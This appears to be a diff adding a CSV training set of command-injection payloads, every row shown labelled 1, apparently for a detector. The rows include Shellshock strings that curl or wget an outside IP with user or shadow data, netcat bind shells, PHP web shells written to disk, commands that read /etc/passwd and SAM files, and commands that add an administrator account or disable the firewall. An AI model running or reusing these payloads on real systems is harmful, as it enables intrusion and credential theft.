@@ -1,0 +1,2111 @@
+sentence,Label
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
+/index.html|id|,1
+;id;,1
+;id,1
+;netstat -a;,1
+;system('cat%20/etc/passwd'),1
+;id;,1
+|id,1
+|/usr/bin/id,1
+|id|,1
+|/usr/bin/id|,1
+||/usr/bin/id|,1
+|id;,1
+||/usr/bin/id;,1
+;id|,1
+;|/usr/bin/id|,1
+\n/bin/ls -al\n,1
+\n/usr/bin/id\n,1
+\nid\n,1
+\n/usr/bin/id;,1
+\nid;,1
+\n/usr/bin/id|,1
+\nid|,1
+;/usr/bin/id\n,1
+;id\n,1
+|usr/bin/id\n,1
+|nid\n,1
+`id`,1
+`/usr/bin/id`,1
+a);id,1
+a;id,1
+a);id;,1
+a;id;,1
+a);id|,1
+a;id|,1
+a)|id,1
+a|id,1
+a)|id;,1
+a|id,1
+|/bin/ls -al,1
+a);/usr/bin/id,1
+a;/usr/bin/id,1
+a);/usr/bin/id;,1
+a;/usr/bin/id;,1
+a);/usr/bin/id|,1
+a;/usr/bin/id|,1
+a)|/usr/bin/id,1
+a|/usr/bin/id,1
+a)|/usr/bin/id;,1
+a|/usr/bin/id,1
+;system('cat%20/etc/passwd'),1
+;system('id'),1
+;system('/usr/bin/id'),1
+%0Acat%20/etc/passwd,1
+%0A/usr/bin/id,1
+%0Aid,1
+%0A/usr/bin/id%0A,1
+%0Aid%0A,1
+& ping -i 30 127.0.0.1 &,1
+& ping -n 30 127.0.0.1 &,1
+%0a ping -i 30 127.0.0.1 %0a,1
+`ping 127.0.0.1`,1
+| id,1
+& id,1
+; id,1
+%0a id %0a,1
+`id`,1
+$;/usr/bin/id,1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",1
+"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",1
+"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",1
+"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",1
+"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",1
+"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",1
+"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",1
+"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",1
+cat /etc/hosts,1
+$(`cat /etc/passwd`),1
+cat /etc/passwd,1
+%0Acat%20/etc/passwd,1
+"{{ get_user_file(""/etc/passwd"") }}",1
+"<!--#exec cmd=""/bin/cat /etc/passwd""-->",1
+"<!--#exec cmd=""/bin/cat /etc/shadow""-->",1
+"<!--#exec cmd=""/usr/bin/id;-->",1
+system('cat /etc/passwd');,1
+"<?php system(""cat /etc/passwd"");?>",1
+`,1
+|| ,1
+| ,1
+; ,1
+',1
+"'""",1
+"
+'",1
+& ,1
+&& ,1
+%0a,1
+%0a%0d,1
+,1
+%0Aid,1
+%0a id %0a,1
+%0Aid%0A,1
+%0a ping -i 30 127.0.0.1 %0a,1
+%0A/usr/bin/id,1
+%0A/usr/bin/id%0A,1
+"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
+%20{${phpinfo()}},1
+%20{${sleep(20)}},1
+%20{${sleep(3)}},1
+a|id|,1
+a;id|,1
+a;id;,1
+a;id\n,1
+() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,1
+| curl http://crowdshield.com/.testing/rce.txt,1
+& curl http://crowdshield.com/.testing/rce.txt,1
+; curl https://crowdshield.com/.testing/rce_vuln.txt,1
+&& curl https://crowdshield.com/.testing/rce_vuln.txt,1
+curl https://crowdshield.com/.testing/rce_vuln.txt,1
+" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
+$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+dir,1
+| dir,1
+; dir,1
+$(`dir`),1
+& dir,1
+&&dir,1
+&& dir,1
+| dir C:\,1
+; dir C:\,1
+& dir C:\,1
+&& dir C:\,1
+dir C:\,1
+| dir C:\Documents and Settings\*,1
+; dir C:\Documents and Settings\*,1
+& dir C:\Documents and Settings\*,1
+&& dir C:\Documents and Settings\*,1
+dir C:\Documents and Settings\*,1
+| dir C:\Users,1
+; dir C:\Users,1
+& dir C:\Users,1
+&& dir C:\Users,1
+dir C:\Users,1
+;echo%20'<script>alert(1)</script>',1
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,1
+"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",1
+"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
+"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",1
+"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php ",1
+"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
+"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",1
+"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
+;echo '<script>alert(1)</script>',1
+echo '<script>alert(1)</script>'// XXXXXXXXXXX,1
+echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,1
+"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",1
+"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",1
+"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",1
+"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",1
+"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S",1
+() { :;}; echo vulnerable 10,1
+eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+eval('ls'),1
+eval('pwd'),1
+eval('pwd');,1
+eval('sleep 5'),1
+eval('sleep 5');,1
+eval('whoami'),1
+eval('whoami');,1
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+exec('ls'),1
+exec('pwd'),1
+exec('pwd');,1
+exec('sleep 5'),1
+exec('sleep 5');,1
+exec('whoami'),1
+exec('whoami');,1
+";{$_GET[""cmd""]}",1
+`id`,1
+|id,1
+| id,1
+;id,1
+;id|,1
+;id;,1
+& id,1
+&&id,1
+;id\n,1
+ifconfig,1
+| ifconfig,1
+; ifconfig,1
+& ifconfig,1
+&& ifconfig,1
+/index.html|id|,1
+ipconfig,1
+| ipconfig /all,1
+; ipconfig /all,1
+& ipconfig /all,1
+&& ipconfig /all,1
+ipconfig /all,1
+ls,1
+$(`ls`),1
+| ls -l /,1
+; ls -l /,1
+& ls -l /,1
+&& ls -l /,1
+ls -l /,1
+| ls -laR /etc,1
+; ls -laR /etc,1
+& ls -laR /etc,1
+&& ls -laR /etc,1
+| ls -laR /var/www,1
+; ls -laR /var/www,1
+& ls -laR /var/www,1
+&& ls -laR /var/www,1
+| ls -l /etc/,1
+; ls -l /etc/,1
+& ls -l /etc/,1
+&& ls -l /etc/,1
+ls -l /etc/,1
+ls -lh /etc/,1
+| ls -l /home/*,1
+; ls -l /home/*,1
+& ls -l /home/*,1
+&& ls -l /home/*,1
+ls -l /home/*,1
+*; ls -lhtR /var/www/,1
+| ls -l /tmp,1
+; ls -l /tmp,1
+& ls -l /tmp,1
+&& ls -l /tmp,1
+ls -l /tmp,1
+| ls -l /var/www/*,1
+; ls -l /var/www/*,1
+& ls -l /var/www/*,1
+&& ls -l /var/www/*,1
+ls -l /var/www/*,1
+\n,1
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,1
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,1
+\n/bin/ls -al\n,1
+| nc -lvvp 4444 -e /bin/sh|,1
+; nc -lvvp 4444 -e /bin/sh;,1
+& nc -lvvp 4444 -e /bin/sh&,1
+&& nc -lvvp 4444 -e /bin/sh &,1
+nc -lvvp 4444 -e /bin/sh,1
+nc -lvvp 4445 -e /bin/sh &,1
+nc -lvvp 4446 -e /bin/sh|,1
+nc -lvvp 4447 -e /bin/sh;,1
+nc -lvvp 4448 -e /bin/sh&,1
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,1
+\necho INJECTX\nexit\n\033[2Asleep 5\n,1
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,1
+| net localgroup Administrators hacker /ADD,1
+; net localgroup Administrators hacker /ADD,1
+& net localgroup Administrators hacker /ADD,1
+&& net localgroup Administrators hacker /ADD,1
+net localgroup Administrators hacker /ADD,1
+| netsh firewall set opmode disable,1
+; netsh firewall set opmode disable,1
+& netsh firewall set opmode disable,1
+&& netsh firewall set opmode disable,1
+netsh firewall set opmode disable,1
+netstat,1
+;netstat -a;,1
+| netstat -an,1
+; netstat -an,1
+& netstat -an,1
+&& netstat -an,1
+netstat -an,1
+| net user hacker Password1 /ADD,1
+; net user hacker Password1 /ADD,1
+& net user hacker Password1 /ADD,1
+&& net user hacker Password1 /ADD,1
+net user hacker Password1 /ADD,1
+| net view,1
+; net view,1
+& net view,1
+&& net view,1
+net view,1
+\nid|,1
+\nid;,1
+\nid\n,1
+\n/usr/bin/id\n,1
+"perl -e 'print ""X""x1024'",1
+"|| perl -e 'print ""X""x16096'",1
+"| perl -e 'print ""X""x16096'",1
+"; perl -e 'print ""X""x16096'",1
+"& perl -e 'print ""X""x16096'",1
+"&& perl -e 'print ""X""x16096'",1
+"perl -e 'print ""X""x16384'",1
+"; perl -e 'print ""X""x2048'",1
+"& perl -e 'print ""X""x2048'",1
+"&& perl -e 'print ""X""x2048'",1
+"perl -e 'print ""X""x2048'",1
+"|| perl -e 'print ""X""x4096'",1
+"| perl -e 'print ""X""x4096'",1
+"; perl -e 'print ""X""x4096'",1
+"& perl -e 'print ""X""x4096'",1
+"&& perl -e 'print ""X""x4096'",1
+"perl -e 'print ""X""x4096'",1
+"|| perl -e 'print ""X""x8096'",1
+"| perl -e 'print ""X""x8096'",1
+"; perl -e 'print ""X""x8096'",1
+"&& perl -e 'print ""X""x8096'",1
+"perl -e 'print ""X""x8192'",1
+"perl -e 'print ""X""x81920'",1
+|| phpinfo(),1
+| phpinfo(),1
+ {${phpinfo()}},1
+;phpinfo(),1
+;phpinfo();//,1
+';phpinfo();//,1
+{${phpinfo()}},1
+& phpinfo(),1
+&& phpinfo(),1
+phpinfo(),1
+phpinfo();,1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",1
+"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1
+"<?php system(""sleep 10"");?>",1
+"<?php system(""sleep 5"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
+"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",1
+:phpversion();,1
+`ping 127.0.0.1`,1
+& ping -i 30 127.0.0.1 &,1
+& ping -n 30 127.0.0.1 &,1
+;${@print(md5(RCEVulnerable))};,1
+"${@print(""RCEVulnerable"")}",1
+${@print(system($_SERVER['HTTP_USER_AGENT']))},1
+pwd,1
+| pwd,1
+; pwd,1
+& pwd,1
+&& pwd,1
+\r,1
+"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
+\r\n,1
+route,1
+| sleep 1,1
+; sleep 1,1
+& sleep 1,1
+&& sleep 1,1
+sleep 1,1
+|| sleep 10,1
+| sleep 10,1
+; sleep 10,1
+{${sleep(10)}},1
+& sleep 10 ,1
+&& sleep 10,1
+sleep 10,1
+|| sleep 15,1
+| sleep 15,1
+; sleep 15,1
+& sleep 15 ,1
+&& sleep 15,1
+ {${sleep(20)}},1
+{${sleep(20)}},1
+ {${sleep(3)}},1
+{${sleep(3)}},1
+| sleep 5,1
+; sleep 5,1
+& sleep 5,1
+&& sleep 5,1
+sleep 5,1
+ {${sleep(hexdec(dechex(20)))}} ,1
+{${sleep(hexdec(dechex(20)))}} ,1
+sysinfo,1
+| sysinfo,1
+; sysinfo,1
+& sysinfo,1
+&& sysinfo,1
+system('cat C:\boot.ini');,1
+system('cat config.php');,1
+|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt'),1
+system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),1
+system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
+systeminfo,1
+| systeminfo,1
+; systeminfo,1
+& systeminfo,1
+&& systeminfo,1
+system('ls'),1
+system('pwd'),1
+system('pwd');,1
+|| system('sleep 5');,1
+| system('sleep 5');,1
+; system('sleep 5');,1
+& system('sleep 5');,1
+&& system('sleep 5');,1
+system('sleep 5'),1
+system('sleep 5');,1
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),1
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('whoami'),1
+system('whoami');,1
+test*; ls -lhtR /var/www/,1
+"test* || perl -e 'print ""X""x16096'",1
+"test* | perl -e 'print ""X""x16096'",1
+"test* & perl -e 'print ""X""x16096'",1
+"test* && perl -e 'print ""X""x16096'",1
+"test*; perl -e 'print ""X""x16096'",1
+$(`type C:\boot.ini`),1
+&&type C:\\boot.ini,1
+| type C:\Windows\repair\SAM,1
+; type C:\Windows\repair\SAM,1
+& type C:\Windows\repair\SAM,1
+&& type C:\Windows\repair\SAM,1
+type C:\Windows\repair\SAM,1
+| type C:\Windows\repair\SYSTEM,1
+; type C:\Windows\repair\SYSTEM,1
+& type C:\Windows\repair\SYSTEM,1
+&& type C:\Windows\repair\SYSTEM,1
